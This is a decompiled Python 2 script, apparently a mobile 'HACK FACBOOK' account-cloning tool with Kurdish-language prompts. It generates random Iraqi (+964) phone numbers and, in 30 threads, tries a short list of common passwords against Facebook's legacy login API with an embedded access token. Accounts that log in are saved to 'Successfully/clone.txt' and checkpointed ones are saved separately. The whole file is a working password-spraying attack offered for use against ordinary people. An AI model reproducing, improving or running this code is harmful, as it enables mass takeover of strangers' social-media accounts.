# Decompiled By RandiSr
# Github : https://github.com/RANDIOLOY
# uncompyle6 version 3.7.4
# Python bytecode 2.7 (62211)
# Decompiled from: Python 2.7.17 (default, Dec  5 2019, 10:45:36) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
# Embedded file name: /sdcard/Download/123.py
# Compiled at: 2021-05-07 05:52:18
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(10000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('')

try:
    import mechanize
except ImportError:
    os.system('')
    time.sleep(1)
    os.system('')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exb():
    print '[!] Exit'
    os.sys.exit()


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def t():
    time.sleep(1)


def cb():
    os.system('clear')


logo = logo = '\n \n'
back = 0
successful = []
cpb = []
oks = []
id = []

def lisensi():
    os.system('clear')
    menu()


def menu():
    os.system('clear')
    print logo
    
    print '\x1b[1;97m[1]\x1b[1;91mHACK FACBOOK'
    print '\n\x1b[1;97m[0]  Exit            '
    print '\x1b[1;97m---------------------------------------------------------\n'
    action()


def action():
    global cpb
    global oks
    peak = raw_input('\n\x1b[1;97mDanayaK HalbzheRa:): \x1b[1;97m')
    if peak == '':
        print '[!] Fill In Correctly'
        action()
    elif peak == '5':
        os.system('clear')
        os.system('xdg-open https://www.snapchat.com/add/im_halo0 ')
    

    elif peak == '2':
        os.system('clear')
        os.system('xdg-open https://www.snapchat.com/add/azhwan5036 ')
    elif peak == '3':
        os.system('clear')
        os.system('xdg-open https://www.snapchat.com/add/x.fish4k')
    elif peak == '4':
        os.system('clear')
        os.system('xdg-open https://www.snapchat.com/add/i4m.dctor')
    elif peak == '1':
        os.system('clear')
        print logo
        print '\x1b[1;97mSaratakay Chan Be... ' + '\n'
        print '\x1b[1;97m770-771-772-773-774-\n 750-751-752-753-754-\n 780-781-782-783-784' + '\n'
        try:
            c = raw_input('\x1b[1;97mCHOOSE CODE: ')
            k = '+964'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif peak == '0':
        menu()
    else:
        print '[!] Fill In Correctly'
        action()
    xxx = str(len(id))
    psb('[\xe2\x9c\x93] Hamu Zhmarakan>>>>: ' + xxx)
    time.sleep(0.5)
    psb('[\xe2\x9c\x93] Dastw Pekrd')
    time.sleep(0.5)
    psb('[\xe2\x9c\x93] Tkaya bOsta Ta Tawaw Abe;)')
    time.sleep(0.5)
    psb('[!] Bo Wastan Dne Toolaka Ctrl+ Z Dagra')
    time.sleep(0.5)
    print '\x1b[1;97m--------------------------------------------------'

    def main(arg):
        user = arg
        try:
            os.mkdir('HALO UP')
        except OSError:
            pass

        try:
            pass1 = '1122334455'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[HACKED BY 968]  ' + k + c + user + '  \x1b[1;92m|  ' + pass1
                okb = open('Successfully/clone.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[SUTAWA] \x1b[1;91m' + k + c + user + '  \x1b[1;97m|  ' + pass1
                cps = open('Checkpoint/clone.txt', 'a')
                cps.write(k + c + user + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
            else:
                pass2 = '123456123456'
                data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;92m[HACKED BY 968]  ' + k + c + user + '  \x1b[1;92m|  ' + pass2
                    okb = open('Successfully/clone.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;91m[SUTAWA] \x1b[1;91m' + k + c + user + '  \x1b[1;97m|  ' + pass2
                    cps = open('Checkpoint/clone.txt', 'a')
                    cps.write(k + c + user + pass2 + '\n')
                    cps.close()
                    cpb.append(c + user + pass2)
                else:
                    pass3 = '112233445566'
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[HACKED BY 968]  ' + k + c + user + '  \x1b[1;92m|  ' + pass3
                        okb = open('Successfully/clone.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;91m[SUTAWA] \x1b[1;91m' + k + c + user + '  \x1b[1;97m|  ' + pass3
                        cps = open('Checkpoint/clone.txt', 'a')
                        cps.write(k + c + user + pass3 + '\n')
                        cps.close()
                        cpb.append(c + user + pass3)
                    else:
                        pass4 = '123456654321'
                        data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[HACKED BY 968]  ' + k + c + user + '  \x1b[1;92m|  ' + pass4
                            okb = open('Successfully/clone.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;91m[SUTAWA] \x1b[1;91m' + k + c + user + '  \x1b[1;97m|  ' + pass4
                            cps = open('Checkpoint/clone.txt', 'a')
                            cps.write(k + c + user + pass4 + '\n')
                            cps.close()
                            cpb.append(c + user + pass4)
                        else:
                            pass5 = '1234554321'
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[HACKED BY 968]  ' + k + c + user + '  \x1b[1;92m|  ' + pass5
                                okb = open('Successfully/clone.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;91m[SUTAWA] \x1b[1;91m' + k + c + user + '  \x1b[1;97m|  ' + pass5
                                cps = open('Checkpoint/clone.txt', 'a')
                                cps.write(k + c + user + pass5 + '\n')
                                cps.close()
                                cpb.append(c + user + pass5)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;97m--------------------------------------------------'
    print '[\xe2\x9c\x93] Process Has Been Completed ...'
    print '[\xe2\x9c\x93] Total Successfully/Checkpoint : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x93] Cloned Accounts Has Been Saved : anggaxd/clone.txt'
    raw_input('\n\x1b[1;97m[\x1b[1;97mBack\x1b[1;95m]')
    menu()


if __name__ == '__main__':
    menu()
# okay decompiling halom.pyc

